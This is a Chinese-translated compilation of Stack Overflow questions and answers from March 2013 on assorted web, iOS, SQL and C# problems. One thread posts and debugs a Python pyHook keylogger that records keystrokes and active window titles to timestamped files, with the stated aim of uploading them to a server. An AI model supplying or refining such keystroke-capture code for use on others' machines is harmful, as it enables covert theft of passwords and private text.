## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T05:59:49.563

他们在 IE8 中修复了这个问题。在以前的版本中，您需要在调用 createElement 时包含名称。来自 MSDN：

> Internet Explorer 8 和更高版本可以在运行时对使用 IHTMLDocument2::createElement 方法动态创建的元素设置 NAME 属性。要在 Internet Explorer 的早期版本中创建具有 NAME 属性的元素，请在使用 IHTMLDocument2::createElement 方法时包含该属性及其值。

这是来自 MSDN 的示例：

```
var newRadioButton = document.createElement("<INPUT TYPE='RADIO' NAME='RADIOTEST'VALUE='First Choice'>") 
```

# ruby-on-rails-3 - 如何与 AngularJS 控制器和 Rails 控制器通信？

> ID：15562967
> 
> 赞同：-3
> 
> 时间：2013-03-22T04:52:26.907
> 
> 标签：ruby-on-rails-3, angularjs

## 请帮我

我想知道如何在**AngularJS中使用 rails 3.2 的辅助方法**

例如：-

我在我的应用程序中使用**作为消息的**gem。

它有一个名为**send_message**的 helper_method ，可以在 rails 应用程序的控制器中使用。

那么如何在**AngularJS 控制器**中使用这个辅助方法。

* * *

基本上我需要知道的是“**如何与 AngularJS 控制器和 Rails 控制器进行通信？** ”

## 甚至有可能这样做吗？请**证明**

* * *

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T23:17:54.277

您似乎在暗示 AngularJs 在服务器上运行。它不是。AngularJS 是一个 Javascript 客户端框架，而 rails 是一个服务器端 Ruby 框架。

话虽如此，我猜你可以在 Rails 中设置一个安静的端点并从 AngularJs 客户端调用它。我会考虑框架之间的通信。

# ios - 核心位置不会更新重大的位置变化

> ID：15562972
> 
> 赞同：0
> 
> 时间：2013-03-22T04:53:08.090
> 
> 标签：ios, core-location

在我的应用程序（部署目标 5.1）中，我使用 CoreLocation 设置提醒功能，它基本上会在设备更新其当前位置时搜索附近的项目（附加位置）。

此功能在现阶段工作不是很稳定，有时无论设备处于活动，挂起和终止状态，它都根本不起作用。我意识到委托方法`locationManager:didUpdateToLocation:fromLocation:`没有被调用。

有没有人可以为我指出一个方向，让这件事正常工作？

这是我对 CLLocationManager 的设置

```
sharedLocationManager = [[CLLocationManager alloc]init];
[ESLocationManager defaultManager].delegate = someDelegateClassInstance;
[[ESLocationManager defaultManager] setDesiredAccuracy:kCLLocationAccuracyHundredMeters];
[[ESLocationManager defaultManager] startMonitoringSignificantLocationChanges]; 
```

以及委托回调的实现

```
- (void)locationManager:(CLLocationManager *)manager didUpdateToLocation:(CLLocation *)newLocation fromLocation:(CLLocation *)oldLocation {

    // If it's a relatively recent event, turn off updates to save power
    NSDate* eventDate = newLocation.timestamp;
    NSTimeInterval howRecent = [eventDate timeIntervalSinceNow];
    if (abs(howRecent) < 20.0) {
        // If the event is recent,find nearby items.
        NSLog(@"latitude %+.6f, longitude %+.6f\n",
              newLocation.coordinate.latitude,
              newLocation.coordinate.longitude);

        //reload nearby list
        NSArray *nearbyItems = [self nearbyItemsForLocation:newLocation];
        if (nearbyItems && nearbyItems.count ) {
            UIApplicationState appState = [[UIApplication sharedApplication] applicationState];
            if (appState != UIApplicationStateActive) {
                [[UIApplication sharedApplication] presentLocalNotificationNow:[self localNotificationForItems:nearbyItems]];
            }
        }
    }

} 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-06-12T21:29:25.123

与此论坛类似的原因与区域监控

[https://devforums.apple.com/message/251046#251046](https://devforums.apple.com/message/251046#251046)

希望这可以帮助

# javascript - 从数据库中随机调用图库图像，间隔重叠

> ID：15562973
> 
> 赞同：0
> 
> 时间：2013-03-22T04:53:14.957
> 
> 标签：javascript, jquery, mysql, css

```
(function makeDiv(){
var divsize = ((Math.random()*100) + 50).toFixed();
var color = '#'+ Math.round(0xffffff * Math.random()).toString(16);
$newdiv = $('<div/>').css({
    'width':divsize+'px',
    'height':divsize+'px',
    'background-color': color
});

var posx = (Math.random() * ($(document).width() - divsize)).toFixed();
var posy = (Math.random() * ($(document).height() - divsize)).toFixed();

$newdiv.css({
    'position':'absolute',
    'left':posx+'px',
    'top':posy+'px',
    'display':'none'
}).appendTo( 'body' ).fadeIn(700).delay(3500).fadeOut(300, function(){
   $(this).remove();
   makeDiv(); 
}); 
})(); 
```

小提琴：http : [//jsfiddle.net/redler/QcUPk/8/](http://jsfiddle.net/redler/QcUPk/8/)

设计模型：http: [//i.imgur.com/D4mhXPZ.jpg](http://i.imgur.com/D4mhXPZ.jpg)

我试过摆弄我找到的这段代码，但我最终还是把它弄坏了。在一个例子中，我的代码每次迭代都会使对象翻倍，它几乎让我的 PC 崩溃了，呵呵。

我需要在这里发生一些事情。

*   我需要至少有 8 个这样的对象同时执行这个出现和消失的动作，彼此重叠稍微偏移（centerOffset？）。每个出现的正方形都应该位于仍然存在的先前图像的前面。

*   这些对象不是彩色方块，而应该是从数据库（产品清单）中随机调用的图像。

*   当您将鼠标悬停在任何图片上时，该过程应该暂停，并且该对象将在您将鼠标放在其上时出现在前面，并显示有关该作品的一些文本。如果您单击它，它会将您导航到项目页面。

注意：随机尺寸元素很好，但我有一些更高的图像，一些更宽的图像等。不知道如何处理。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T07:31:41.717

有相当多的动画/定时工作来保持 8 个对象同时出现/消失。下一个难点是捕获鼠标悬停在对象上以及何时“来到前面”，您可能需要 jQuery*悬停意图*插件。无论如何，这里有一些工作代码可以同时将 8 个随机对象动画到屏幕上，并且当您将鼠标悬停在对象上时，出现/消失的行为将停止。当您的鼠标离开对象时，动画将继续：http: [//jsfiddle.net/amyamy86/Q6XKv/](http://jsfiddle.net/amyamy86/Q6XKv/)

主要要点是这个（完整代码参见小提琴）：

```
// Adds the box and animates in/out
var addBox = function () {
    var makeBox = function () {
        var divsize = ((Math.random() * 100) + 50).toFixed();
        var color = '#' + Math.round(0xffffff * Math.random()).toString(16);
        var newBox = $('<div class="box" id="box' + boxIds + '"/>').css({
            'width': divsize + 'px',
                'height': divsize + 'px',
                'background-color': color
        });
        return newBox;
    };
    var newBox = makeBox();
    var boxSize = newBox.width();
    var posx = (Math.random() * ($(document).width() - boxSize)).toFixed();
    var posy = (Math.random() * ($(document).height() - boxSize)).toFixed();
    newBox.css({
        'position': 'absolute',
            'left': posx + 'px',
            'top': posy + 'px',
            'display': 'none'
    }).appendTo('body').fadeIn(ANIMATE_SPEED / 2, function () {
        if (timer !== null) {
            $(this)
            .delay(ANIMATE_SPEED * MAX_BOXES)
            .fadeTo(1, 1, function () {
                if (timer !== null) {
                    var id = $(this).attr('id');
                    removeBox(id);
                }
            });
        }
    });
    boxIdList.push(boxIds++);
    lastBox = newBox;
    numBoxes++;
    return newBox;
};

// Add the boxes in at interval animateSpeed, if there's too many then don't add
var animateBox = function () {
    if (numBoxes < MAX_BOXES) {
        addBox();
    } else {
        removeBox(boxIdList[0]);
    }
    timer = setTimeout(animateBox, ANIMATE_SPEED); // re-set timer for the next interval
};

// starts everything off
var start = function () {
    timer = setTimeout(animateBox, ANIMATE_SPEED);
}; 
```

这应该足以让您为交互和效果添加所需的详细程度。

# asp.net-mvc - 为什么在一种情况下显示下拉列表而不在另一种情况下显示？

> ID：15562977
> 
> 赞同：0
> 
> 时间：2013-03-22T04:53:32.997
> 
> 标签：asp.net-mvc

在我看来，当我这样做时，下拉列表会正确显示 -

```
@Html.DropDownListFor(m => m.SelectedEstimateState, Model.EstimateStateList.ToSelectList(c => c.Value, c => c.Text), new { }); 
```

但不是当我这样做时 -

```
@{
    Html.DropDownListFor(m => m.SelectedEstimateState, Model.EstimateStateList.ToSelectList(c => c.Value, c => c.Text), new { });
} 
```

两者有什么区别？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T05:01:19.897

这是`code block expression`，用于评估表达式。但它没有写出来。有关更多信息，请检查剃刀语法[Razor 语法](http://haacked.com/archive/2011/01/06/razor-syntax-quick-reference.aspx)和[`web-programming-using-the-razor-syntax`](http://www.asp.net/web-pages/tutorials/basics/2-introduction-to-asp-net-web-programming-using-the-razor-syntax)

```
@{
     Html.DropDownListFor(m => m.SelectedEstimateState, Model.EstimateStateList.ToSelectList(c => c.Value, c => c.Text), new { });

} 
```

下面将写出内容（基本上它与带有编码的 response.write() 相同）

```
@Html.DropDownListFor(m => m.SelectedEstimateState, Model.EstimateStateList.ToSelectList(c => c.Value, c => c.Text), new { }); 
```

# python - 如何提取文件数据并将数据发送到表单并在python中自动填写详细信息？

> ID：15562981
> 
> 赞同：0
> 
> 时间：2013-03-22T04:53:54.970
> 
> 标签：python

我正在使用 Ubuntu 操作系统，如何提取文件数据并将文件数据发送到表单并在 python 中自动填写详细信息？

举个简单的例子。在 resume.doc 中，我的姓名、电话号码和教育详细信息等。我必须提取这些数据并将其发送到表单并自动填写详细信息。

Resume.doc abc 0000000 xxxxxxxxxx

userform.html（通过从 Resume.doc 中提取数据自动填充文本字段）

姓名：abc 电话号码：0000000 教育信息：xxxxxxxxxx

你的帮助真的很明显..谢谢你的提前！！

# asp.net-mvc-3 - 如何为 Kendo UI 自动完成控件设置宽度

> ID：15562982
> 
> 赞同：2
> 
> 时间：2013-03-22T04:54:06.017
> 
> 标签：asp.net-mvc-3, razor, autocomplete, kendo-ui

我在 div 中使用 kendo ui 自动完成控件。我为 div 设置了样式，但它对我不起作用。

```
<div>

@(Html.Kendo().AutoComplete()
.Name("NameAutoComplete") 
.DataTextField("FullName") 
.BindTo(Model.NameList)  
.Filter("contains") 
)

</div> 
```

谢谢你。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-22T21:53:42.343

事实上，最简单的方法是通过 HtmlAttributes 方法来实现。

例如

```
@(Html.Kendo().AutoComplete().Name("test").HtmlAttributes(new { style="width:400px"})) 
```

# php - 如何在我的 htaccess 文件中包含带有其他变量的 JSON 数组？

> ID：15562983
> 
> 赞同：1
> 
> 时间：2013-03-22T04:54:06.643
> 
> 标签：php, json, .htaccess

* * *

更新：我已将我的网址更新为以下内容：

脚本IWrote/1111/%5B%7B%93num%94%3A%93NX543%20.c38%202000%94%7D%2C%7B%93num%94%3A%93NX543%20.c38%202000%94%7D%5D .json

它给出了这样的数组：（当我使用 print_r($_GET['nums']) 时）

```
[{“num”:“NX543 .c38 2000”},{“num”:“NX543 .c38 2000”}] 
```

这是有效的 JSON，但没有通过以下行解码：

```
$callNums = json_decode($_GET['nums'], true); 
```

但是，仅用“array”替换“json_decode”实际上会将 $_GET['nums'] 视为字符串并且仍然不起作用

* * *

所以我试图通过 URL 为我正在编写的 API 传递 JSON 数组，如下所示：

```
scriptIWrote/1111/[0000,0000].json 
```

我的 htaccess 规则设置如下：

```
RewriteCond %{THE_REQUEST} GET
RewriteRule ^scriptIWrote/([^/]+)/([^/]+)(?=.json) root/scriptIWrote/doThing.php?type=$1&names=$2 [L,QSA] 
```

但是，当我打印出参数中包含的内容时，如下所示：

```
$names = json_decode($_GET['nums'], true);
//array of sheet values
$type = $_GET['type'];

error_log($names[0] . $nums[1]);
error_log($type); 
```

$nums[0] 和 $nums[1] 为空，但 $type 显示正确的值；我知道我在我的 htaccess 中犯了一个错误，但我不确定我做错了什么......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T14:20:06.673

终于想通了：

网址：

```
scriptIWrote/1111/%5B%22NX543%20.c38%202000%22%2C%22NX543%20.c38%202000%22%5D.json 
```

PHP：

```
$nums = json_decode(stripslashes($_GET['nums']), true); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T05:18:41.133

我看到了几个可能的问题。首先是 URL`[`中`]`保留的通用分隔符。如果你想使用它们，它们需要进行百分比编码。

其次`[frank,bob]`是无效的 JSON。您需要在这些值周围加上双引号。

我从未听说过有人在 URL 中传递 JSON。这似乎是一个考虑不周的想法。

# jquery - 移除一个元素

> ID：15562984
> 
> 赞同：1
> 
> 时间：2013-03-22T04:54:23.427
> 
> 标签：jquery, html

使用以下代码从 html 文件中删除一个元素，

```
$("#sample").remove(); 
```

查看源代码时，被移除的元素仍然出现在源代码中。是否可以从源代码中删除元素？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-22T04:55:39.593

*无法*使用客户端上的脚本（如 javascript）从源代码管理中删除元素。它从 DOM 中移除，不会参与渲染，也无法通过脚本访问。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T04:58:55.310

源代码是静态的。它只是用于加载页面的代码。修改 DOM 不会影响源代码。就像添加到 DOM 也不会添加到源代码中一样。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T05:03:48.687

我同意 Adil 的观点，通过脚本语言，即 javascript/jquery 是不可能的...

```
$("#sample").empty();
//will not work... 
```

# javascript - 自定义对象的主干结构

> ID：15562988
> 
> 赞同：0
> 
> 时间：2013-03-22T04:55:11.750
> 
> 标签：javascript, backbone.js

查看一些主干示例，我看到了一些像这样的简单模型：

```
var Vehicle = Backbone.Model.extend(
{
   summary: function () {
   return 'Vehicles move';
   }

}); 
```

或者

```
Vehicle = (function () {
return Backbone.Model.extend({
   defaults: {

   },

   initialize: {

   }
});

})(); 
```

编辑：（澄清）我想知道是否有人可以解释定义骨干对象的两种方法之间的区别以及更传统的方法。我知道它们内部没有相同的方法，但我更感兴趣的是第一个方法如何扩展主干模型，第二个方法将其包装在一个闭包中。我不确定我是否真的掌握了每种情况以及何时使用哪种模式。提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T05:19:18.990

我会认为第一种形式更加传统，特别是因为我什至在主[Backbone.js](http://backbonejs.org/)网站上都没有看到第二种形式。

要了解它们如何做同样的事情，首先要注意 Backbone.Model.extend() 是一个也返回一个函数的函数：

```
> Backbone.Model.extend()
  function () { return parent.apply(this, arguments); } 
```

所以这个变量`Vehicle`最终被设置为一个模型构造方法的函数，无论你怎么看它。不过，我会认为第二种形式更间接且不必要地复杂：它设置`Vehicle`为调用一个函数的结果，该函数本身只是返回`Backbone.Model.extend()`，所以它只是一种更复杂的表达方式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T08:55:13.837

如果模型的所有属性都易于定义，则建议使用模式 1。但是，如果任何属性实现起来很复杂，因此需要一个“私有”辅助函数，您不想在模型或全局对象中公开它，最好利用闭包来隐藏它。那是模式2。

一个例子：

```
Vehicle = (function () {

function helper1() {} //don't want to expose it
function helper2() {}

return Backbone.Model.extend({
   defaults: {

   },

   initialize: {

   }

   summary: function() {
      helper1();
      helper1();
   }

});

})(); 
```

# python - 使用 pyhook 的 Python 线程

> ID：15562993
> 
> 赞同：1
> 
> 时间：2013-03-22T04:55:32.920
> 
> 标签：python, multithreading, keylogger, pyhook

```
import win32api
import win32console
import win32gui
import pythoncom, pyHook , sys, time , os , threading
import shutil ,socket ,datetime
from ftplib import FTP
from threading import Thread 
def fi():
   while True:
        dr =  socket.gethostname()
        if not os.path.exists(dr):
                os.makedirs(dr)
        else:
                pass
        now = datetime.datetime.now()
        p = now.strftime("%Y-%m-%d %H-%M")
        temp_path = dr + '/' + p
        fil =  temp_path + '.txt'
        sys.stdout = open(fil,'w')
        statinfo = os.stat(fil)
        fils = statinfo.st_size
        if(fils > 20):
            now = datetime.datetime.now()
            p = now.strftime("%Y-%m-%d %H-%M")
            temp_path = dr + '/' + p
            fil =  temp_path + '.txt'
            sys.stdout = open(fil,'w')  
        else:
            pass

lastWindow = None
lastWindow=win32gui.GetWindowText (win32gui.GetForegroundWindow())
print lastWindow
def OnKeyboardEvent(event):
        global lastWindow       
        window = event.WindowName
        key = chr(event.Ascii)
        if window != lastWindow:
            start = '-----------------------------------'
            print str(start)
            print window 
            lastWindow = window
        print key
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()

if __name__ == '__main__':
    Thread(target = fi).start()
    Thread(target = OnKeyboardEvent(event)).start() 
```

当文件大小超过 20KB 时，第一个代码块 def fi() 正在创建一个新文件。第二个块是键盘记录器，并将密钥记录在文件中。我是 python 和多线程的新手。现在当我运行这段代码时。我只能让键盘记录器工作，没有文件形成，也没有创建日志。请帮我解决这个问题。

*   我需要从这段代码中创建一个以当前时间命名的日志文件并将所有关键字记录到文件中。然后如果文件变得超过20KB，那么它应该将旧文件上传到服务器并使用新的当前时间制作一个新文件。我是 python 新手，这就是为什么我不确定这段代码有什么问题以及它没有做什么。*

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T06:52:41.097

## 第一个问题

您确实创建了两个线程 - 但第二个的目标**是** `OnKeyboardEvent(event)`. 这没有`return`-statement，所以返回值是`None`，所以 Thread 没有目标。

## 第二个问题

您的代码永远不会到达`if __name__ == "__main__":`-part。它阻止了`pythoncom.PumpMessages()`，至少对我来说。

## 第三个问题

起初我很困惑你的代码如何在不引发异常的情况下运行 -**`event`最后一行没有在这个范围的前面定义**。但是问题 2 目前阻止了问题 3 的生效，但是如果你解决了这个问题，你也将不得不面对问题 3。

## 解决方案

老实说，我真的不明白你想做什么。您绝对应该解决每个问题。

1.  不要**调用**线程的目标，给线程一个函数对象。如果您需要参数，请使用`args`-argument `Thread`，例如`Thread(target = OnKeyboardEvent, args=(event)).start()`

2.  我不知道的用法`pythoncom`太好了。也许`pythocom.PumpWaitingMessages()`是你想要的？

3.  我不知道你想在这里做什么。为什么要在线程中调用回调函数？这个函数没有循环或任何东西，所以它会运行一次然后停止。我想这只是一次绝望的尝试？

## 一般说明

*   我不建议重新定义`sys.stdout`，除非你真的必须这样做。
*   请`close()`打开您打开的文件。也许考虑使用`with`- 语句。
*   更好的是：利用`logging`-module。它提供了许多不同的可能性。
*   创建线程时，请考虑结束。什么时候停止？你怎么能从另一个线程阻止它？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T21:13:24.277

我注意到您对原始消息的编辑/评论。如果您仍在为此工作，这是我的建议。

忘记日志记录、线程和其他你正在尝试做的事情。专注于让 PyHook 以最简单的状态工作。从原始代码来看，您似乎很难正确设置 pyHook（注意，我目前没有安装 pyhook，所以这不是经过测试的代码）：

```
import pyHook

def OnKeyboardEvent(event):
    print(event)

if __name__ == '__main__':

    global hm      #if we make this global, we can access inside OnKeyboardEvent
    hm = pyHook.HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()

    try:
        pythoncom.PumpMessages()   #This call will block forever unless interrupted,
                               # so get everything ready before you execute this.

    except (KeyboardInterrupt, SystemExit) as e: #We will exit cleanly if we are told
        print(e)    
        os._exit() 
```

此代码旨在简单地挂钩任何按键事件，将事件实例打印到控制台。从技术上讲，您不应该在事件回调内部做太多工作（它应该尽快返回），但是为了测试，您可以将一些*工作函数*放入事件循环中。这只是暂时的，直到你准备好混合你的线程工作循环。（如果文件访问功能导致错误，请不要感到惊讶）。

先让这个工作。然后尝试将标准输出存储到文件中。（暂时忘记 20Kb 文件的限制）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T08:24:49.137

```
import win32api
import win32console
import win32gui
import pythoncom, pyHook , sys, time , os , threading
import shutil ,socket ,datetime
from ftplib import FTP
from threading import Thread 

def OnKeyboardEvent(event):

    # Now you can access your hookmanager, and change which keys you want 
    # to watch. Using 'event' and 'hm', you can do some fun stuff in here.
    global hm
    global lastWindow

    window=win32gui.GetWindowText(win32gui.GetForegroundWindow())      
    ####window = event.WindowName
    ####I'm not sure, but these last two functions may not return the "exact" 
    ####name values. I would call the same function you trying to compare against.

    key = chr(event.Ascii)
    if window != lastWindow:   ## Now you know these at least come from same function
        start = '-----------------------------------'
        print str(start)
        print window 
        lastWindow = window
    print key

def fi():    #This is your "worker loop"
   while True:
        dr =  socket.gethostname()
        if not os.path.exists(dr):
                os.makedirs(dr)
        else:
                pass
        now = datetime.datetime.now()
        p = now.strftime("%Y-%m-%d %H-%M")
        temp_path = dr + '/' + p
        fil =  temp_path + '.txt'
        sys.stdout = open(fil,'w')
        statinfo = os.stat(fil)
        fils = statinfo.st_size
        if(fils > 20):
            now = datetime.datetime.now()
            p = now.strftime("%Y-%m-%d %H-%M")
            temp_path = dr + '/' + p
            fil =  temp_path + '.txt'
            sys.stdout = open(fil,'w')  
        else:
            pass

if __name__ == '__main__':
    """This stuff only executes once"""

    global lastWindow
    lastWindow = None
    lastWindow=win32gui.GetWindowText(win32gui.GetForegroundWindow())
    print lastWindow

    global hm      #if we make this global, we can access inside OnKeyboardEvent
    hm = pyHook.HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()

    Thread(target = fi).start() #This is your worker loop

    # We don't need this. OnKeyboardEvent will get callbacks from system
    # thanks to Hookmanager and PumpMessages
    ##Thread(target = OnKeyboardEvent(event)).start()

    # You wouldn't want to do it with the way we are set up, but this is a "polite"
    # way to get PumpMessages to return...

    #ctypes.windll.user32.PostQuitMessage(0) # stops pumpMessages

    try:
        pythoncom.PumpMessages()   #This call will block forever unless interrupted

    except (KeyboardInterrupt, SystemExit) as e: #We will exit cleanly if we are told
        print(e)    
        os._exit() 
```

# mysql - MySQL 从两列连接两个表

> ID：15562996
> 
> 赞同：0
> 
> 时间：2013-03-22T04:55:40.430
> 
> 标签：mysql

我将加入两个表，其中两列包含另一个表的 id。

表用户

```
id | first_name | last_name |
---+------------+-----------+
 1 | John       | Doe       |
 2 | Jane       | Doe       |
 3 | Some       | Name      | 
```

表戳

```
id |    date    | applicant_id  | app_by_id |
---+------------+---------------+-----------+
 1 | 2013-03-15 | 1             | 2         |
 2 | 2013-03-10 | 2             | 3         |
 3 | 2013-03-13 | 2             | 1         | 
```

我想展示的内容：

```
 date    | applicant | app_by    |
------------+-----------+-----------+
 2013-03-15 | John Doe  | Jane Doe  |
 2013-03-10 | Jane Doe  | Some Name |
 2013-03-13 | Jane Doe  | John Doe  | 
```

我的查询：

```
SELECT CONCAT_WS(' ', NULLIF(t1.first_name, ' '), NULLIF(t1.last_name, ' ')) AS applicant,
    CONCAT_WS(' ', NULLIF(t1.first_name, ' '), NULLIF(t1.last_name, ' ')) AS app_by,
    t2.date
    FROM users t1
    INNER JOIN stamp t2 ON applicant_id = t1.id 
```

我知道我的查询有问题，但我不知道如何解决。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T04:58:19.920

试试你的加入

```
SELECT  CONCAT_WS(' ', NULLIF(u1.first_name, ' '), NULLIF(u1.last_name, ' ')) AS applicant,
        CONCAT_WS(' ', NULLIF(u2.first_name, ' '), NULLIF(u2.last_name, ' ')) AS app_by,
        s.date
FROM    stamp s INNER JOIN
        user u1 ON  s.applicant_id = u1.id INNER JOIN
        user u2 ON  s.app_by_id = u1.id 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T05:01:02.920

尝试使用这样的子查询，而不是连接。

```
SELECT date, 
(SELECT CONCAT_WS(' ', NULLIF(first_name, ' '), NULLIF.last_name, ' ')) from USERS WHERE id = s.applicant_id) as applicant, 
(SELECT CONCAT_WS(' ', NULLIF(first_name, ' '), NULLIF.last_name, ' ')) from USERS WHERE id = s.app_by_id) as app_by 
from stamp s 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T05:26:47.773

您可能希望使用`LEFT JOIN`以便即使其他连接条件失败，也可以在每列中获取值。以下代码也适用于常规`JOIN`.

```
SELECT s.date,
CONCAT_WS(' ', NULLIF(u1.first_name, ' '), NULLIF(u1.last_name, ' ')) AS applicant,
CONCAT_WS(' ', NULLIF(u2.first_name, ' '), NULLIF(u2.last_name, ' ')) AS app_by
FROM stamp s
LEFT JOIN users u1 ON s.applicant_id = u1.id
LEFT JOIN users u2 ON s.app_by_id = u2.id 
```

证明：[http ://sqlfiddle.com/#!2/39aff/1/0](http://sqlfiddle.com/#!2/39aff/1/0)

# c# - 将双精度值舍入为以 .0 或 .5 结尾的值

> ID：15562997
> 
> 赞同：-3
> 
> 时间：2013-03-22T04:55:41.743
> 
> 标签：c#

我正在尝试将一些值四舍五入作为以下示例，并且需要一些帮助来为其编写数学计算：

```
input -> 25 ÷ 4 = 6.25        output -> 6.5

input -> 15.5 ÷ 4 = 3.875     output -> 4.0

input -> 24.5 ÷ 4 = 6.125     output -> 6.0 
```

知道如何编写圆形数学程序吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T05:05:14.303

这应该这样做。

```
double Divide(double numerator, double denominator)
{
    double result = numerator / denominator;

    //round to nearest half-integer
    result = Math.Round(result * 2, MidpointRounding.AwayFromZero) / 2;

    // due to peculiarities of IEEE754 floating point arithmetic
    // we need to round again after dividing back by two
    // to avoid a result like 1.49999999.
    return Math.Round(result, 1);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-23T04:47:16.460

抱歉不知道您遇到的困难，所以我猜可能是不同类型的浮点数。下面的代码就是这样做的：

```
public static decimal RoundedDivide<T>(T a, T b) {
    var x=2*Convert.ToDecimal(a)/Convert.ToDecimal(b);
    x=((int)(.5m+x)>x?1:0)+(int)x;
    return x/2;
} 
```

有两点需要注意：

1.  我不能绑定 的约束`ValueType`，所以如果你传递引用类型的对象，它可能会抛出
2.  如果您希望`double`作为返回类型，则只需将其更改`.5m`为`.5`,`Convert.ToDecimal`即可`Convert.ToDouble`

# cakephp - 更新 CakePHP 中的行

> ID：15562999
> 
> 赞同：0
> 
> 时间：2013-03-22T04:55:56.143
> 
> 标签：cakephp, cakephp-2.3

我试图更新 cakePHP 2.3.1 中的一行。我有类测试扩展 AppModel 与 $validates 数组，以及控制器（简化）：

```
public function editstudent()   {
    if($this->request->data)    {
        $this->Test->stuId= $this->data['Test']['stuId'];
        if ($this->Test->save($this->request->data))    {
            $this->set('state',1);
        }
    } 
```

书上说：

> 创建或更新由模型的 id 字段控制。如果设置了 $Model->id，则更新具有此主键的记录。否则会创建一个新记录：

如上所述，我设置了 $this->Test->StuId 但是当我提交表单时它仍然显示：

> 错误：SQLSTATE [23000]：违反完整性约束：1062 键“PRIMARY”的重复条目“” SQL 查询：INSERT INTO ........

如错误所示，查询仍然是 INSERT 而不是 UPDATE 那么我需要做些什么来更新，请帮帮我:(

编辑：@thaJeztah 我已经像这样编辑了我的视图：

```
class Test extends AppModel {
var $name= 'Test';
var $primaryKey= 'stuId';
public $validate= array(.......);
} 
```

但它仍然显示同样的问题

> 数据库错误错误：SQLSTATE [23000]：完整性约束违规：1062 键 'PRIMARY' SQL 查询的重复条目 ''：INSERT INTO `cakePhp`。`tests`( `stuName`, `stuDoB`, `stuAdd`) 价值观 ('Đào Đức Anh', '2013-03-25', 'Kim Liên')

如您所见，查询仍然是插入而不是更新，您能帮我解释为什么仍然会发生这种情况:(

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T07:28:33.330

因为您没有遵循 CakePHP 约定（请参阅[CakePHP 模型约定](http://book.cakephp.org/2.0/en/getting-started/cakephp-conventions.html#model-and-database-conventions)，您需要手动指定用于模型的主键和/或数据库表；

```
class Test extends AppModel {
    public $primaryKey = 'studId';
} 
```

另外，我想知道“测试”是否是保留名称，可能根本不是模型的专有名称。

但是，如果这是一个新项目，我**强烈**建议您遵守 CakePHP 约定，它们的存在是有原因的，并且在使用该框架进行开发时会使生活变得更加轻松

**更新**`$useTable`根据 OP 的评论 删除了该属性